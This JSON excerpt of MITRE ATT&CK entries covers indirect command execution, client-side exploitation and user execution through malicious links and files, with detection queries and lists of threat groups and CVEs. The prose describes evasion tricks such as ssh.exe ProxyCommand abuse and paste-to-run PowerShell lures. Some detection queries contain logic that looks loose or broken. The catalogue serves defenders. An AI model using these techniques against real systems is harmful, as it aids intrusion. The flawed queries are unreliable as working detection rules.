    "Description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invokingcmd. For example,Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL),Scriptrunner.exe, as well as other utilities may invoke the execution of programs and commands from aCommand and Scripting Interpreter, Run window, or via scripts.[1][2][3][4][5]Adversaries may also abuse thessh.exebinary to execute malicious commands via theProxyCommandandLocalCommandoptions, which can be invoked via the-oflag or by modifying the SSH config file.[6]Adversaries may abuse these features forDefense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage ofcmdor file extensions more commonly associated with malicious payloads.",
    "Detects": [
      "Monitor executed commands and arguments to bypass security restrictions that limit the use of command-line interpreters. Look for suspicious command-line arguments, such asssh.exeused with theProxyCommandorLocalCommandoptions.",
      "Monitor for newly constructed processes and/or command-lines that can be used instead of invoking cmd (i.e.pcalua.exe,winrs.exe,cscript/wscript.exe,hh.exe,ssh.exe, orbash.exe). Compare recent invocations of utilities with prior history of known good arguments to determine anomalous and potentially adversarial activity."
    ],
    "Procedure Examples": [
      "Forfilescan be used to subvert controls and possibly conceal command execution by not directly invokingcmd.[1][2]",
      "Lazarus Grouppersistence mechanisms have usedforfiles.exeto execute .htm files.[7]",
      "RedCurlhas used pcalua.exe to obfuscate binary execution and remote connections.[8]",
      "Revenge RATuses theForfilesutility to execute commands on the system.[9]"
    ]
  },
  "T1203": {
    "Name": "Exploitation for Client Execution",
    "Description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target throughDrive-by CompromiseandSpearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted throughPhishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "Detects": [
      "Monitor log entries from browsers, Office applications, and third-party applications for suspicious behavior, such as crashes, abnormal terminations, or instability that could indicate an attempted exploit.Analytic 1 - logs related to application crashes or unexpected behavior, which could signal an attempt to exploit vulnerabilities.sourcetype=WinEventLog:Application EventCode=1000| search application IN (\"chrome.exe\", \"firefox.exe\", \"winword.exe\", \"excel.exe\", \"acrord32.exe\", \"flashplayer.exe\")| stats count by application event_description| where event_description IN (\"crash\", \"instability\", \"unexpected termination\")",
      "Monitor file system changes associated with exploitation, such as suspicious files dropped by browsers, Office apps, or third-party programs, which can be used for further stages of attack.Analytic 1 - identifies file creations or modifications associated with commonly exploited softwaresourcetype=linux_auditd| search file_path IN (\"/Users//Library/\", \"C:\\Users\\\\AppData\\Roaming\\\", \"/home/*/.config/\", \"/var/tmp/\")| stats count by file_path process_name user| where process_name IN (\"chrome.exe\", \"firefox.exe\", \"winword.exe\", \"excel.exe\", \"acrord32.exe\", \"flashplayer.exe\")",
      "Look for unusual outbound connections following abnormal process execution, as this could indicate an adversary has established a foothold and is initiating communication with C2 infrastructure.Analytic 1 - monitors for network traffic generated by exploited processessourcetype=network_flow OR (sourcetype=Sysmon AND EventCode=3)| search process_name IN (\"chrome.exe\", \"firefox.exe\", \"winword.exe\", \"excel.exe\", \"acrord32.exe\", \"flashplayer.exe\")| stats count by src_ip dest_ip dest_port process_name| where dest_ip NOT IN (\"\")",
      "Identify abnormal child processes spawned by applications commonly targeted by exploits, such as browsers or Office programs, particularly those launched with suspicious arguments or into unknown directories.Example, it is not expected behavior for print spool service to be executing discovery type processes. However, this is one example and could be any number of native or third party processes that are executing either unusual or unknown (potentially adversary brought) processes.Note:- Analytic 1, look for instances where Office Applications (e.g., Word, Excel, PowerPoint) are launched with suspicious parameters or from unusual locations- Analytic 2, look for abnormal child process creation by Office Applications especially when accompanied by suspicious command-line parametersAnalytic 1 - Office Application Process Execution(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND (Image= \"\\winword.exe\" OR Image= \"\\excel.exe\" OR Image= \"\\powerpnt.exe\") AND (CommandLine= \"macro\" OR CommandLine= \"automation\" OR CommandLine= \"shellcode\") AND ParentCommandLine= \"open*\"Analytic 2 - Unusual Child Process Creation(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND (ParentImage= \"\\winword.exe\" OR ParentImage= \"\\excel.exe\" OR ParentImage= \"\\powerpnt.exe\") AND (Image != \"\\system32\\\" OR Image != \"*\\program files\")"
    ],
    "Procedure Examples": [
      "admin@338has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.[1]",
      "Agent Teslahas exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.[2]",
      "Andarielhas exploited numerous ActiveX vulnerabilities, including zero-days.[3][4][5]",
      "Aoqin Dragonhas exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.[6]",
      "APT12has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).[7][8]",
      "APT28has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[9]",
      "APT29has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.[10][11][12]",
      "APT3has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.[13][14]",
      "APT32has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)[15]",
      "APT33has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).[16][17]",
      "APT37has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.[18][19][20][21]",
      "APT41leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.[22]",
      "Axiomhas used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.[23]",
      "Bankshotleverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.[24]",
      "BITTERhas exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.[25][26]",
      "BlackTechhas exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.[27]",
      "BRONZE BUTLERhas exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.[28][29]",
      "Cobalt Grouphad exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.[30][31][32][33][34][35][36][37]",
      "Cobalt Strikecan exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.[38][39]",
      "Confuciushas exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.[40][41]",
      "Darkhotelhas exploited Adobe Flash vulnerability CVE-2015-8651 for execution.[42]",
      "DealersChoiceleverages vulnerable versions of Flash to perform execution.[43]",
      "Dragonflyhas exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.[44]",
      "Elderwoodhas used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.[45]",
      "Ember Bearhas used exploits to enable follow-on execution of frameworks such as Meterpreter.[46]",
      "EvilBunnyhas exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.[47]",
      "EXOTIC LILYhas used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.[48]",
      "DuringFrankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.[49]",
      "HAWKBALLhas exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.[50]",
      "Higaisahas exploited CVE-2018-0798 for execution.[51]",
      "Inceptionhas exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.[52][53][54][55]",
      "InvisiMolehas installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.[56]",
      "Lazarus Grouphas exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[24]",
      "Leviathanhas exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.[57][58][59][60]",
      "MuddyWaterhas exploited the Office vulnerability CVE-2017-0199 for execution.[61]",
      "Mustang Pandahas exploited CVE-2017-0199 in Microsoft Word to execute code.[62]",
      "OilRighas exploited CVE-2024-30088 to run arbitrary code in the context ofSYSTEM.[63]",
      "DuringOperation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.[64]",
      "Patchworkuses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.[65][66][67][68][69][70][71]",
      "Ramsayhas been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.[72][73]",
      "Mustang Pandaused the GrimResource exploitation technique via specially crafted MSC files for arbitrary code execution duringRedDelta Modified PlugX Infection Chain Operations.[74]",
      "Saint Bearhas leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments.[75]",
      "Sandworm Teamhas exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).[76][77][78]",
      "Sea Turtlehas used exploits for vulnerabilities such as CVE-2021-44228, CVE-2021-21974, and CVE-2022-0847 to achieve client code execution.[79]",
      "Sidewinderhas exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.[80][81]",
      "SpeakUpattempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.[82]",
      "SUPERNOVAwas installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).[83][84]",
      "TA459has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.[85]",
      "The White Companyhas taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.[86]",
      "Threat Group-3390has exploited CVE-2018-0798 in Equation Editor.[87]",
      "Tonto Teamhas exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.[88][89][90][91]",
      "Transparent Tribehas crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.[92]",
      "Tropic Trooperhas executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.[93][94]",
      "VersaMemwas installed through exploitation of CVE-2024-39717 in Versa Director servers.[95]",
      "Woody RAThas relied on CVE-2022-30190 (Follina) for execution during delivery.[96]",
      "Xbashcan attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.[97][98]",
      "XLoaderhas exploited Office vulnerabilities during local execution such as CVE-2017-11882 and CVE-2018-0798.[99]"
    ]
  },
  "T1204": {
    "Name": "User Execution",
    "Description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms ofPhishing.WhileUser Executionfrequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly afterInternal Spearphishing.Adversaries may also deceive users into performing actions such as:EnablingRemote Access Tools, allowing direct control of the system to the adversaryRunning malicious JavaScript in their browser, allowing adversaries toSteal Web Session Cookies[1][2]Downloading and executing malware forUser ExecutionCoerceing users to copy, paste, and execute malicious code manually[3][4]For example, tech support scams can be facilitated throughPhishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware orRemote Access Tools.[5]",
    "Detects": [
      "Monitor logs from applications to detect user-initiated actions such as opening malicious documents, clicking on phishing links, or executing downloaded malware.Analytic 1 - Logs showing unexpected user actions triggering unusual processes.sourcetype=application_log EventCode=1000 OR EventCode=1001| search application IN (\"winword.exe\", \"excel.exe\", \"chrome.exe\", \"firefox.exe\", \"adobe.exe\", \"zip.exe\")| stats count by application event_description| where event_description IN (\"opened document\", \"clicked link\", \"executed file\")",
      "Detect commands triggered by users, especially related to decompression tools (e.g., zip files) that may unpack malicious payloads. This includes compression applications, such as those for zip files, that can be used toDeobfuscate/Decode Files or Informationin payloads.Analytic 1 - Command lines showing decompression or decoding actions.sourcetype=WinEventLog:Powershell EventCode=4104| search process_name IN (\"powershell.exe\", \"cmd.exe\", \"zip.exe\", \"winrar.exe\")| stats count by process_name command_line user| where command_line LIKE \"%unzip%\" OR command_line LIKE \"%decode%\"",
      "Monitor for newly constructed containers that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.Analytic 1 - Containers communicating with unexpected external services.sourcetype=container_creation OR sourcetype=container_start| stats count by container_name event_description user| where container_name NOT IN (\"\") AND event_description IN (\"created\", \"started\")",
      "Monitor for the activation or invocation of a container (ex: docker start or docker restart)",
      "Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
      "Monitor for newly constructed image that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.",
      "Monitor for newly constructed instances that may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.",
      "Monitor for the activation or invocation of an instance (ex: instance.start within GCP Audit Logs)",
      "Monitor network traffic patterns associated with web-based user actions, such as clicking on phishing links or executing malware that tries to establish C2 communication.Analytic 1 - Web-based network connections to suspicious destinations.sourcetype=sysmon EventCode=3| search process_name IN (\"winword.exe\", \"chrome.exe\", \"firefox.exe\") | stats count by src_ip dest_ip dest_port process_name| where dest_ip NOT IN (\"\")",
      "Monitor and analyze traffic patterns and packet inspection associated with web-based network connections that are sent to malicious or suspicious destinations (e.g. destinations attributed to phishing campaigns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments (e.g. monitor anomalies in use of files that do not normally initiate network connections or unusual connections initiated by regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, or msiexec.exe).",
      "Identify processes spawned by user actions, especially from Office documents, PDFs, or web browsers that could lead to malicious execution.Analytic 1 - Processes created from user interaction with files.((sourcetype=WinEventLog:Security EventCode=4688) OR (sourcetype=Sysmon EventCode=1))| search parent_process IN (\"winword.exe\", \"excel.exe\", \"chrome.exe\", \"firefox.exe\")| stats count by parent_process process_name command_line user| where process_name NOT IN (\"chrome.exe\", \"firefox.exe\", \"winword.exe\", \"excel.exe\")"
    ],
    "Procedure Examples": [
      "LAPSUS$has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowingLAPSUS$to take control of an authenticated system.[6]",
      "Lumma Stealerhas been distributed through a fake CAPTCHA that presents instructions to the victim to open Windows Run window (\"Windows Button + R\") and paste clipboard contents (\"CTRL + V\") and press \"Enter\" to execute a Base64-encoded PowerShell.[7][8][9]",
      "Raspberry Robinexecution can rely on users directly interacting with malicious LNK files.[10]",
      "Scattered Spiderhas impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.[11]",
      "Water Curupira Pikabot Distributionrequires users to interact with malicious attachments in order to startPikabotinstallation.[12]"
    ]
  },
  "T1204.001": {
    "Name": "User Execution:Malicious Link",
    "Description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior fromSpearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability viaExploitation for Client Execution. Links may also lead users to download files that require execution viaMalicious File.",
    "Detects": [
      "Monitor for files created on a system after a user clicks on a malicious link. Look for common download paths and suspicious files with executable extensions.Analytic 1 - Files downloaded from links and then executed.sourcetype=Sysmon EventCode=11| search file_path IN (\"/Downloads/\", \"/Temp/\")| stats count by file_name file_path user| where file_name LIKE \"%.exe\" OR file_name LIKE \"%.zip\" OR file_name LIKE \"%.js\" OR file_name LIKE \"%.docm\"",
      "Monitor for network connections to suspicious or external sites shortly after a user clicks on a link, especially if the URL is linked to phishing or malicious activities.Analytic 1 - Web-based network connections to suspicious destinations.sourcetype=network_connection| search process_name IN (\"chrome.exe\", \"firefox.exe\", \"iexplore.exe\", \"msedge.exe\") OR src_ip IN (\"\")",
      "Inspect the content of the network traffic to look for signs of suspicious web traffic, such as phishing links or abnormal HTTP GET/POST requests.Analytic 1 - Suspicious network traffic contentsourcetype=network_traffic_content| search http_method=\"GET\" OR http_method=\"POST\"| stats count by url domain http_method| where domain NOT IN (\"\")"
    ],
    "Procedure Examples": [
      "AppleJeus's spearphishing links required user interaction to navigate to the malicious website.[1]",
      "APT28has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[2][3]",
      "APT29has used various forms of spearphishing attempting to get a user to click on a malicious link.[4][5]",
      "APT3has lured victims into clicking malicious links delivered through spearphishing.[6]",
      "APT32has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.[7][8][9]",
      "APT33has lured users to click links to malicious HTML applications delivered via spearphishing emails.[10][11]",
      "APT38has used links to execute a malicious Visual Basic script.[12]",
      "APT39has sent spearphishing emails in an attempt to lure users to click on a malicious link.[13][14]",
      "BackConfighas compromised victims via links to URLs hosting malicious content.[15]",
      "Bazarcan gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.[16][17][18]",
      "BlackTechhas used e-mails with malicious links to lure victims into installing malware.[19]",
      "Bumblebeehas relied upon a user downloading a file from a OneDrive link for execution.[20][21]",
      "DuringC0011,Transparent Triberelied on student targets to click on a malicious link sent via email.[22]",
      "DuringC0021, the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file.[23]",
      "Cobalt Grouphas sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.[24][25][26]",
      "Confuciushas lured victims into clicking on a malicious link sent through spearphishing.[27]",
      "Daggerflyhas used strategic website compromise to deliver a malicious link requiring user interaction.[28]",
      "Earth Luscahas sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.[29]",
      "Elderwoodhas leveraged multiple types of spearphishing in order to attempt to get a user to open links.[30][31]",
      "Emotethas relied upon users clicking on a malicious link delivered through spearphishing.[32][33]",
      "Evilnumhas sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.[34]",
      "EXOTIC LILYhas used malicious links to lure users into executing malicious payloads.[35]",
      "FIN4has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).[36][37]",
      "FIN7has used malicious links to lure victims into downloading malware.[38]",
      "FIN8has used emails with malicious links to lure victims into installing malware.[39][40][41]",
      "Gamaredon Grouphas attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content.[42]",
      "Gootloaderhas been executed through malicious links presented to users as internet search results.[43][44]",
      "Grandoreirohas used malicious links to gain execution on victim machines.[45][46]",
      "GuLoaderhas relied upon users clicking on links to malicious documents.[47]",
      "Hancitorhas relied upon users clicking on a malicious link delivered through phishing.[48]",
      "Javalihas achieved execution through victims clicking links to malicious websites.[49]",
      "Kerrdownhas gained execution through victims opening malicious links.[9]",
      "Kimsukyhas lured victims into clicking malicious links.[50]",
      "KOCTOPUShas relied on victims clicking on a malicious link delivered via email.[51]",
      "Latrodectushas been executed through malicious links distributed in email campaigns.[52][53]",
      "LazyScripterhas relied upon users clicking on links to malicious files.[51]",
      "Leviathanhas sent spearphishing email links attempting to get a user to click.[54][55]",
      "LuminousMothhas lured victims into clicking malicious Dropbox download links delivered through spearphishing.[56]",
      "Machetehas has relied on users opening malicious links delivered through spearphishing to execute malware.[57][58][59]",
      "Magic Houndhas attempted to lure victims into opening malicious links embedded in emails.[60][61]",
      "Melcozhas gained execution through victims opening malicious links.[49]",
      "Mofang's spearphishing emails required a user to click the link to connect to a compromised website.[62]",
      "Moleratshas sent malicious links via email trick users into opening a RAR archive and running an executable.[63][64]",
      "MuddyWaterhas distributed URLs in phishing e-mails that link to lure documents.[65][66][67]",
      "Mustang Pandahas sent malicious links including links directing victims to a Google Drive folder.[68][69][70]",
      "Mustard Tempesthas lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.[71][72]",
      "NETWIREhas been executed through convincing victims into clicking malicious links.[73][47]",
      "DuringNight Dragon, threat actors enticed users to click on links in spearphishing emails to download malware.[74]",
      "ObliqueRAThas gained execution on targeted systems through luring users to click on links to malicious URLs.[75][76]",
      "OilRighas delivered malicious links to achieve execution on the target system.[77][78][79][80]",
      "DuringOperation Dream Job,Lazarus Grouplured users into executing a malicious link to disclose private account information or provide initial access.[81][82]",
      "DuringOperation Dust Storm, the threat actors relied on a victim clicking on a malicious link sent via email.[83]",
      "DuringOperation Spalax, the threat actors relied on a victim to click on a malicious link distributed via phishing emails.[84]",
      "OutSteelhas relied on a user to click a malicious link within a spearphishing email.[85]",
      "Patchworkhas used spearphishing with links to try to get users to click, download and open malicious files.[86][87][88][15]",
      "PLEADhas been executed via malicious links in e-mails.[19]",
      "Ponyhas attempted to lure targets into clicking links in spoofed emails from legitimate banks.[89]",
      "QakBothas gained execution through users opening malicious links.[90][91][92][93][94][95][96]",
      "RedCurlhas used malicious links to infect the victim machines.[97][98]",
      "Mustang Pandadistributed hyperlinks that would result in an MSC file running a PowerShell command to download and install a remotely-hosted MSI file duringRedDelta Modified PlugX Infection Chain Operations.[99]",
      "Saint Bearhas, in addition to email-based phishing attachments, used malicious websites masquerading as legitimate entities to host links to malicious files for user execution.[85][100]",
      "Saint Bothas relied on users to click on a malicious link delivered via a spearphishing.[85]",
      "Sandworm Teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[101]",
      "Sidewinderhas lured targets to click on malicious links to gain execution in the target environment.[102][103][104][105]",
      "SMOKEDHAMhas relied upon users clicking on a malicious link delivered through phishing.[106]",
      "Snip3has been executed through luring victims into clicking malicious links.[107]",
      "SocGholishhas lured victims into interacting with malicious links on compromised websites for execution.[72]",
      "SpicyOmelettehas been executed through malicious links within spearphishing emails.[26]",
      "Squirrelwafflehas relied on victims to click on a malicious link send via phishing campaigns.[108]",
      "TA2541has used malicious links to cloud and web services to gain execution on victim machines.[109][73]",
      "TA505has used lures to get users to click links in emails and attachments. For example,TA505makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files.[110][111][112][113][114][115][116][117]",
      "TA577has lured users into executing malicious JavaScript files by sending malicious links via email.[52]",
      "TA578has placed malicious links in contact forms on victim sites, often spoofing a copyright complaint, to redirect users to malicious file downloads.[52]",
      "Transparent Tribehas directed users to open URLs hosting malicious content.[75][76]",
      "TSCookiehas been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.[118]",
      "Turlahas used spearphishing via a link to get users to download and run their malware.[119]",
      "Water Curupira Pikabot Distributiondistributed a PDF attachment containing a malicious link to aPikabotinstaller.[120]",
      "Windshifthas used links embedded in e-mails to lure victims into executing malicious code.[121]",
      "Winter Vivernhas mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution.[122][123]",
      "Wizard Spiderhas lured victims into clicking a malicious link delivered through spearphishing.[124]",
      "ZIRCONIUMhas used malicious links in e-mails to lure victims into downloading malware.[125][126]"
    ]
  },
  "T1204.002": {
    "Name": "User Execution:Malicious File",
    "Description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior fromSpearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.Adversaries may employ various forms ofMasqueradingandObfuscated Files or Informationto increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.[1]WhileMalicious Filefrequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly afterInternal Spearphishing.",
    "Detects": [
      "Monitor for files created in unusual directories or files with suspicious extensions. Focus on common locations like the Downloads folder, Temp directories, or the user’s Desktop, especially files that would be of interest from spearphishing attachments.While batch files are not inherently malicious, it is uncommon to see them created after OS installation, especially in the Windows directory. This analytic looks for the suspicious activity of a batch file being created within the C:\\Windows\\System32 directory tree. There will be only occasional false positives due to administrator actions.For MacOS, utilities that work in concert with Apple’s Endpoint Security Framework such as File Monitor can be used to track file creation events.Analytic 1 - Batch File Write to System32(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"11\") file_path=\"system32\" AND file_extension=\".bat\"Analytic 2 - New file creation in unusual directories.sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11| search file_path IN (\"/Downloads/\", \"/Temp/\", \"/Desktop/\")| stats count by file_name file_extension file_path user| where file_extension IN (\"doc\", \"docx\", \"pdf\", \"xls\", \"rtf\", \"exe\", \"scr\", \"lnk\", \"pif\", \"cpl\", \"zip\")",
      "Monitor for processes spawned after opening a suspicious file. Common applications that might be exploited are Microsoft Word, PDF readers, or compression utilities.Analytic 1 - Processes created from malicious files.(sourcetype=WinEventLog:Security EventCode=4688) OR (sourcetype=Sysmon EventCode=1)| search process_name IN (\"WINWORD.EXE\", \"EXCEL.EXE\", \"PDFReader.exe\", \"7z.exe\", \"powershell.exe\", \"cmd.exe\")| stats count by process_name parent_process_name command_line user| where parent_process_name IN (\"explorer.exe\", \"outlook.exe\", \"thunderbird.exe\")"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamleveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them.[2]",
      "admin@338has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.[3]",
      "Agent Teslahas been executed through malicious e-mail attachments[4]",
      "Ajax Security Teamhas lured victims into executing malicious files.[5]",
      "Andarielhas attempted to lure victims into enabling malicious macros within email attachments.[6]",
      "Aoqin Dragonhas lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.[7]",
      "AppleJeushas required user execution of a malicious MSI installer.[8]",
      "AppleSeedcan achieve execution through users running malicious file attachments distributed via email.[9]",
      "APT-C-36has prompted victims to accept macros in order to execute the subsequent payload.[10]",
      "APT12has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.[11][12]",
      "APT19attempted to get users to launch malicious attachments delivered via spearphishing emails.[13]",
      "APT28attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.[14][15][16]",
      "APT29has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files.[17][18][19]",
      "APT30has relied on users to execute malicious file attachments delivered via spearphishing emails.[20]",
      "APT32has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.[21][22][23][24][25]",
      "APT33has used malicious e-mail attachments to lure victims into executing malware.[26]",
      "APT37has sent spearphishing attachments attempting to get a user to open them.[27]",
      "APT38has attempted to lure victims into enabling malicious macros within email attachments.[28]Additionally,APT38has used malicious Word documents and shortcut files.[29]",
      "APT39has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.[30][31][32][33]",
      "Astarothhas used malicious files including VBS, LNK, and HTML for execution.[34]",
      "Bad Rabbithas been executed through user installation of an executable disguised as a flash installer.[35][36]",
      "BADFLICKhas relied upon users clicking on a malicious attachment delivered through spearphishing.[37]",
      "Bandookhas used lure documents to convince the user to enable macros.[38]",
      "Bisonalhas relied on users to execute malicious file attachments delivered via spearphishing emails.[39]",
      "BITTERhas attempted to lure victims into opening malicious attachments delivered via spearphishing.[40][41]",
      "Black Bastahas been downloaded and executed from malicious Excel files.[42][43]",
